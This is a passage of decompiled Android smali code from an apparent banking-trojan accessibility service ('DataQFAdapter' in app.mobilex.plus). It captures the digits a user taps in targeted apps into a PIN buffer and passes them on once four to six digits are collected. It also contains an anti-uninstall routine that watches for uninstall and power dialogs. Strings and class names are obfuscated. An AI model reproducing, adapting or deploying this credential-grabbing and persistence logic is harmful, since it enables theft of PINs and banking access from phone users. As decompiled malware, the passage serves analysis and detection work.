    .line 14
    .line 15
    goto/16 :goto_11

    nop

    .line 16
    .line 17
    :cond_0
    invoke-direct {v1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->isImePackage(Ljava/lang/String;)Z

    .line 18
    .line 19
    .line 20
    move-result v2

    .line 21
    if-eqz v2, :cond_1

    .line 22
    .line 23
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 24
    .line 25
    :cond_1
    move-object/from16 v6, v0

    .line 26
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 27
    .line 28
    .line 29
    move-result-object v13
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 30
    if-nez v13, :cond_2

    .line 31
    .line 32
    goto/16 :goto_11

    .line 33
    .line 34
    :cond_2
    :try_start_1
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 35
    .line 36
    .line 37
    move-result-object v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 38
    const-string v2, ""

    .line 39
    .line 40
    if-eqz v0, :cond_3

    .line 41
    .line 42
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 43
    .line 44
    .line 45
    move-result-object v0

    .line 46
    if-nez v0, :cond_4

    .line 47
    .line 48
    goto :goto_0

    .line 49
    :catchall_0
    move-exception v0

    .line 50
    goto/16 :goto_10

    .line 51
    .line 52
    :cond_3
    :goto_0
    move-object v0, v2

    .line 53
    :cond_4
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 54
    .line 55
    .line 56
    move-result-object v3

    .line 57
    if-eqz v3, :cond_6

    .line 58
    .line 59
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 60
    .line 61
    .line 62
    move-result-object v3

    .line 63
    if-nez v3, :cond_5

    .line 64
    .line 65
    goto :goto_1

    .line 66
    :cond_5
    move-object/from16 v10, v3

    .line 67
    goto :goto_2

    .line 68
    :cond_6
    :goto_1
    move-object/from16 v10, v2

    .line 69
    :goto_2
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    .line 70
    .line 71
    .line 72
    move-result-object v3

    .line 73
    if-nez v3, :cond_7

    .line 74
    .line 75
    move-object v11, v2

    nop

    .line 76
    goto :goto_3

    .line 77
    :cond_7
    move-object v11, v3

    nop

    .line 78
    :goto_3
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 79
    .line 80
    .line 81
    move-result v2

    .line 82
    if-nez v2, :cond_8

    .line 83
    .line 84
    move-object v0, v10

    .line 85
    :cond_8
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 86
    .line 87
    .line 88
    move-result v2

    .line 89
    if-nez v2, :cond_9

    .line 90
    .line 91
    invoke-direct {v1, v13}, Lapp/mobilex/plus/services/DataQFAdapter;->findDigitInChildren(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 92
    .line 93
    .line 94
    move-result-object v0

    .line 95
    :cond_9
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 96
    .line 97
    .line 98
    move-result v2

    .line 99
    if-nez v2, :cond_a

    .line 100
    .line 101
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 102
    .line 103
    invoke-virtual {v2, v6}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 104
    .line 105
    .line 106
    move-result v2

    .line 107
    if-eqz v2, :cond_a

    .line 108
    .line 109
    invoke-direct {v1, v13}, Lapp/mobilex/plus/services/DataQFAdapter;->findDigitAmongSiblings(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v0

    .line 113
    :cond_a
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 114
    .line 115
    .line 116
    move-result v2

    .line 117
    if-nez v2, :cond_b

    .line 118
    .line 119
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 120
    .line 121
    invoke-virtual {v2, v6}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 122
    .line 123
    .line 124
    move-result v2

    .line 125
    if-eqz v2, :cond_b

    .line 126
    .line 127
    invoke-direct {v1, v13}, Lapp/mobilex/plus/services/DataQFAdapter;->findDigitByBounds(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    move-result-object v0

    .line 131
    :cond_b
    move-object/from16 v4, v0

    .line 132
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 133
    .line 134
    .line 135
    move-result v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 136
    if-nez v0, :cond_c

    .line 137
    .line 138
    :try_start_3
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 139
    .line 140
    .line 141
    :catchall_1
    return-void

    .line 142
    :cond_c
    :try_start_4
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 143
    .line 144
    .line 145
    move-result v0

    .line 146
    const/16 v14, 0x0

    .line 147
    const/16 v15, 0x1

    .line 148
    if-ne v0, v15, :cond_d

    .line 149
    .line 150
    invoke-virtual {v4, v14}, Ljava/lang/String;->charAt(I)C

    .line 151
    .line 152
    .line 153
    move-result v0

    .line 154
    invoke-static {v0}, Ljava/lang/Character;->isDigit(C)Z

    .line 155
    .line 156
    .line 157
    move-result v0
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 158
    if-eqz v0, :cond_d

    .line 159
    .line 160
    move v0, v15

    .line 161
    goto/16 :goto_4

    .line 162
    :cond_d
    move/from16 v0, v14

    .line 163
    :goto_4
    const-string v16, "0033007F0055"

    .line 164
    .line 165
    if-nez v0, :cond_11

    .line 166
    .line 167
    :try_start_5
    const-string v2, "001D004D000B00CA00A900F50091009A00680032"

    .line 168
    .line 169
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 170
    .line 171
    .line 172
    move-result-object v2

    .line 173
    invoke-static {v2}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    .line 174
    .line 175
    .line 176
    move-result-object v2

    .line 177
    invoke-virtual {v2, v4}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    .line 178
    .line 179
    .line 180
    move-result-object v2

    nop

    .line 181
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->matches()Z

    .line 182
    .line 183
    .line 184
    move-result v2

    .line 185
    if-nez v2, :cond_11

    .line 186
    .line 187
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 188
    .line 189
    .line 190
    move-result v2

    .line 191
    const/4 v3, 0x3

    .line 192
    if-gt v2, v3, :cond_f

    .line 193
    .line 194
    move v2, v14

    .line 195
    :goto_5
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 196
    .line 197
    .line 198
    move-result v3

    .line 199
    if-ge v2, v3, :cond_11

    .line 200
    .line 201
    invoke-virtual {v4, v2}, Ljava/lang/String;->charAt(I)C

    .line 202
    .line 203
    .line 204
    move-result v3

    .line 205
    invoke-static {v3}, Ljava/lang/Character;->isDigit(C)Z

    .line 206
    .line 207
    .line 208
    move-result v3

    .line 209
    if-nez v3, :cond_e

    .line 210
    .line 211
    goto/16 :goto_6

    .line 212
    :cond_e
    add-int/lit8 v2, v2, 0x1

    .line 213
    .line 214
    goto :goto_5

    .line 215
    :cond_f
    :goto_6
    invoke-static/range {v16 .. v16}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 216
    .line 217
    .line 218
    move-result-object v2

    .line 219
    invoke-static {v11, v2, v15}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 220
    .line 221
    .line 222
    move-result v2

    .line 223
    if-nez v2, :cond_11

    .line 224
    .line 225
    const-string v2, "key"

    .line 226
    .line 227
    invoke-static {v11, v2, v15}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 228
    .line 229
    .line 230
    move-result v2

    .line 231
    if-nez v2, :cond_11

    .line 232
    .line 233
    const-string v2, "0027007F005C008E00E4"

    .line 234
    .line 235
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 236
    .line 237
    .line 238
    move-result-object v2

    .line 239
    invoke-static {v11, v2, v15}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 240
    .line 241
    .line 242
    move-result v2

    .line 243
    if-nez v2, :cond_11

    nop

    nop

    .line 244
    .line 245
    const-string v2, "002D00630056009700F100BB"

    nop

    .line 246
    .line 247
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 248
    .line 249
    .line 250
    move-result-object v2

    .line 251
    invoke-static {v11, v2, v15}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 252
    .line 253
    .line 254
    move-result v2

    .line 255
    if-eqz v2, :cond_10

    .line 256
    .line 257
    goto/16 :goto_7

    .line 258
    :cond_10
    move/from16 v2, v14

    .line 259
    goto/16 :goto_8

    .line 260
    :cond_11
    :goto_7
    move v2, v15

    .line 261
    :goto_8
    sget-object v3, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 262
    .line 263
    invoke-virtual {v4, v3}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 264
    .line 265
    .line 266
    move-result-object v3

    .line 267
    const-string v5, "ok"

    .line 268
    .line 269
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 270
    .line 271
    .line 272
    move-result v5

    .line 273
    if-nez v5, :cond_13

    .line 274
    .line 275
    const-string v5, "047D042C"

    .line 276
    .line 277
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 278
    .line 279
    .line 280
    move-result-object v5

    .line 281
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 282
    .line 283
    .line 284
    move-result v5

    .line 285
    if-nez v5, :cond_13

    .line 286
    .line 287
    const-string v5, "00260078004F008200E2"

    .line 288
    .line 289
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 290
    .line 291
    .line 292
    move-result-object v5

    .line 293
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 294
    .line 295
    .line 296
    move-result v5

    .line 297
    if-nez v5, :cond_13

    .line 298
    .line 299
    const-string v5, "04710428040204A504A8"

    .line 300
    .line 301
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 302
    .line 303
    .line 304
    move-result-object v5

    nop

    .line 305
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 306
    .line 307
    .line 308
    move-result v5

    .line 309
    if-nez v5, :cond_13

    .line 310
    .line 311
    const-string v5, "04770426040004D204A5"

    .line 312
    .line 313
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 314
    .line 315
    .line 316
    move-result-object v5

    .line 317
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 318
    .line 319
    .line 320
    move-result v5

    .line 321
    if-nez v5, :cond_13

    nop

    nop

    .line 322
    .line 323
    const-string v5, "002D007300430093"

    .line 324
    .line 325
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 326
    .line 327
    .line 328
    move-result-object v5

    .line 329
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 330
    .line 331
    .line 332
    move-result v5

    .line 333
    if-nez v5, :cond_13

    nop

    .line 334
    .line 335
    const-string v5, "002000790055008100F900AD00DF"

    .line 336
    .line 337
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 338
    .line 339
    .line 340
    move-result-object v5

    .line 341
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 342
    .line 343
    .line 344
    move-result v5

    .line 345
    if-nez v5, :cond_13

    .line 346
    .line 347
    const-string v5, "047C0428040F04A504A204EA04F204F3047B04540477"

    .line 348
    .line 349
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 350
    .line 351
    .line 352
    move-result-object v5

    .line 353
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 354
    .line 355
    .line 356
    move-result v5

    .line 357
    if-nez v5, :cond_13

    .line 358
    .line 359
    const-string v5, "002100770058008C00E300AF00D300A40026"

    .line 360
    .line 361
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 362
    .line 363
    .line 364
    move-result-object v5

    .line 365
    invoke-static {v3, v5, v14}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 366
    .line 367
    .line 368
    move-result v5

    .line 369
    if-nez v5, :cond_13

    .line 370
    .line 371
    const-string v5, "002700730057008200E400BA"

    .line 372
    .line 373
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 374
    .line 375
    .line 376
    move-result-object v5

    .line 377
    invoke-static {v3, v5, v14}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 378
    .line 379
    .line 380
    move-result v5

    .line 381
    if-nez v5, :cond_13

    nop

    nop

    .line 382
    .line 383
    const-string v5, "\u232b"

    .line 384
    .line 385
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 386
    .line 387
    .line 388
    move-result v3

    .line 389
    if-eqz v3, :cond_12

    .line 390
    .line 391
    goto :goto_9

    .line 392
    :cond_12
    move/from16 v17, v14

    nop

    .line 393
    .line 394
    goto :goto_a

    .line 395
    :cond_13
    :goto_9
    move/from16 v17, v15

    nop

    nop

    .line 396
    .line 397
    :goto_a
    if-nez v0, :cond_14

    nop

    .line 398
    .line 399
    if-nez v2, :cond_14

    .line 400
    .line 401
    if-eqz v17, :cond_1c

    .line 402
    .line 403
    :cond_14
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 404
    .line 405
    .line 406
    move-result-wide v7

    nop

    nop

    .line 407
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 408
    .line 409
    invoke-static {v6, v2}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 410
    .line 411
    .line 412
    move-result v2

    .line 413
    if-eqz v2, :cond_15

    .line 414
    .line 415
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 416
    .line 417
    goto/16 :goto_b

    .line 418
    :cond_15
    invoke-direct {v1, v6}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 419
    .line 420
    .line 421
    move-result-object v2

    .line 422
    :goto_b
    if-eqz v0, :cond_18

    .line 423
    .line 424
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinPkg:Ljava/lang/String;

    .line 425
    .line 426
    invoke-static {v6, v3}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 427
    .line 428
    .line 429
    move-result v3

    nop

    .line 430
    if-eqz v3, :cond_16

    .line 431
    .line 432
    iget-wide v14, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinLastTime:J

    .line 433
    .line 434
    sub-long v14, v7, v14

    .line 435
    .line 436
    const-wide/16 v18, 0x3a98

    .line 437
    .line 438
    cmp-long v3, v14, v18

    .line 439
    .line 440
    if-lez v3, :cond_17

    .line 441
    .line 442
    :cond_16
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 443
    .line 444
    const/16 v5, 0x0

    .line 445
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 446
    .line 447
    .line 448
    iput-object v6, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinPkg:Ljava/lang/String;

    .line 449
    .line 450
    :cond_17
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 451
    .line 452
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 453
    .line 454
    .line 455
    iput-wide v7, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinLastTime:J

    .line 456
    .line 457
    :cond_18
    const-string v3, "00370077004B00B800FB00BA00CB"

    .line 458
    .line 459
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 460
    .line 461
    .line 462
    move-result-object v3

    .line 463
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    .line 464
    .line 465
    .line 466
    move-result v5

    .line 467
    if-nez v5, :cond_19

    .line 468
    .line 469
    move-object v5, v6

    .line 470
    goto :goto_c

    .line 471
    :cond_19
    move-object v5, v2

    .line 472
    :goto_c
    if-eqz v0, :cond_1a

    .line 473
    .line 474
    const-string v0, "0033007F005500B800E000BE00D6"

    .line 475
    .line 476
    :goto_d
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 477
    .line 478
    .line 479
    move-result-object v0

    .line 480
    move-object v9, v0

    .line 481
    goto :goto_e

    .line 482
    :cond_1a
    const-string v0, "00210063004F009300FF00B1"

    nop

    nop

    .line 483
    .line 484
    goto :goto_d

    .line 485
    :goto_e
    new-instance v2, Lv/s/NxAMaDFbSCxW6M03f;

    nop

    nop

    .line 486
    .line 487
    const/16 v12, 0x0

    .line 488
    invoke-direct/range {v2 .. v12}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 489
    .line 490
    .line 491
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 492
    .line 493
    invoke-virtual {v0, v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 494
    .line 495
    .line 496
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 497
    .line 498
    invoke-virtual {v0, v6}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 499
    .line 500
    .line 501
    move-result v0

    .line 502
    if-eqz v0, :cond_1c

    .line 503
    .line 504
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 505
    .line 506
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    .line 507
    .line 508
    .line 509
    move-result v0

    .line 510
    const/16 v2, 0x4

    .line 511
    if-lt v0, v2, :cond_1c

    .line 512
    .line 513
    if-nez v17, :cond_1b

    .line 514
    .line 515
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 516
    .line 517
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    .line 518
    .line 519
    .line 520
    move-result v0

    .line 521
    const/16 v2, 0x6

    .line 522
    if-lt v0, v2, :cond_1c

    .line 523
    .line 524
    :cond_1b
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 525
    .line 526
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 527
    .line 528
    .line 529
    move-result-object v0

    .line 530
    invoke-static/range {v16 .. v16}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 531
    .line 532
    .line 533
    move-result-object v2

    .line 534
    const-string v3, "00370077004B00B800E000B600DC009800330077005F"

    .line 535
    .line 536
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 537
    .line 538
    .line 539
    move-result-object v3

    .line 540
    const/4 v4, 0x1

    .line 541
    invoke-static {v6, v0, v2, v3, v4}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 542
    .line 543
    .line 544
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 545
    .line 546
    const/4 v5, 0x0

    .line 547
    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->setLength(I)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 548
    .line 549
    .line 550
    :cond_1c
    :goto_f
    :try_start_6
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    .line 551
    .line 552
    .line 553
    goto :goto_11

    .line 554
    :catchall_2
    move-exception v0

    .line 555
    const/4 v13, 0x0

    .line 556
    :goto_10
    :try_start_7
    const-string v2, "00200077004B009300E500AD00D70093002200660070008200E900FF00D700B500310079004900DD00B0"

    .line 557
    .line 558
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 559
    .line 560
    .line 561
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_4

    .line 562
    .line 563
    .line 564
    if-eqz v13, :cond_1d

    .line 565
    .line 566
    goto :goto_f

    .line 567
    :catchall_3
    :cond_1d
    :goto_11
    return-void

    .line 568
    :catchall_4
    move-exception v0

    .line 569
    if-eqz v13, :cond_1e

    .line 570
    .line 571
    :try_start_8
    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_5

    .line 572
    .line 573
    .line 574
    :catchall_5
    :cond_1e
    throw v0
.end method

.method private final checkAntiUninstall(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 26

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 4
    .line 5
    .line 6
    move-result v0

    .line 7
    const/16 v2, -0x1c

    add-int/lit8 v2, v2, 0x3c

    .line 8
    .line 9
    if-eq v0, v2, :cond_0

    .line 10
    .line 11
    goto/16 :goto_4

    .line 12
    .line 13
    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 14
    .line 15
    .line 16
    move-result-object v0

    .line 17
    if-eqz v0, :cond_1d

    .line 18
    .line 19
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 20
    .line 21
    .line 22
    move-result-object v0

    .line 23
    if-eqz v0, :cond_1d

    .line 24
    .line 25
    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 26
    .line 27
    invoke-virtual {v0, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 28
    .line 29
    .line 30
    move-result-object v3

    .line 31
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    .line 32
    .line 33
    .line 34
    move-result-object v0

    .line 35
    const-string v4, ""

    .line 36
    .line 37
    if-eqz v0, :cond_1

    .line 38
    .line 39
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 40
    .line 41
    .line 42
    move-result-object v0

    .line 43
    if-eqz v0, :cond_1

    .line 44
    .line 45
    invoke-virtual {v0, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 46
    .line 47
    .line 48
    move-result-object v0

    .line 49
    goto :goto_0

    .line 50
    :cond_1
    move-object v0, v4

    .line 51
    :goto_0
    const-string v5, "0030006F0048009300F500B200C700AE"

    .line 52
    .line 53
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 54
    .line 55
    .line 56
    move-result-object v5

    .line 57
    const/16 v6, 0x0

    .line 58
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 59
    .line 60
    .line 61
    move-result v5

    .line 62
    if-nez v5, :cond_2

    .line 63
    .line 64
    const-string v5, "0024007A0054008500F100B300D300A40037007F0054008900E3"

    .line 65
    .line 66
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    move-result-object v5

    .line 70
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 71
    .line 72
    .line 73
    move-result v5

    nop

    .line 74
    if-eqz v5, :cond_3

    .line 75
    .line 76
    :cond_2
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Power:Z

    .line 77
    .line 78
    if-eqz v5, :cond_3

    .line 79
    .line 80
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->checkPowerDialog()V

    .line 81
    .line 82
    .line 83
    return-void

    .line 84
    :cond_3
    const-string v5, "0034007F005F008000F500AB"

    .line 85
    .line 86
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 87
    .line 88
    .line 89
    move-result-object v5

    .line 90
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 91
    .line 92
    .line 93
    move-result v5

    .line 94
    if-nez v5, :cond_1d

    .line 95
    .line 96
    const-string v5, "00370079005A009400E4"

    .line 97
    .line 98
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 99
    .line 100
    .line 101
    move-result-object v5

    .line 102
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 103
    .line 104
    .line 105
    move-result v5

    nop

    .line 106
    if-eqz v5, :cond_4

    .line 107
    .line 108
    goto/16 :goto_4

    .line 109
    .line 110
    :cond_4
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Unin:Z

    .line 111
    .line 112
    const-string v7, "003300770058008C00F100B800D700AE002D0065004F008600FC00B300D700B5"

    .line 113
    .line 114
    const-string v8, "003600780052008900E300AB00D300AB002F"

    .line 115
    .line 116
    if-eqz v5, :cond_7

    nop

    .line 117
    .line 118
    invoke-virtual {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->isInBlockCooldown()Z

    .line 119
    .line 120
    .line 121
    move-result v5

    .line 122
    if-eqz v5, :cond_7

    .line 123
    .line 124
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 125
    .line 126
    .line 127
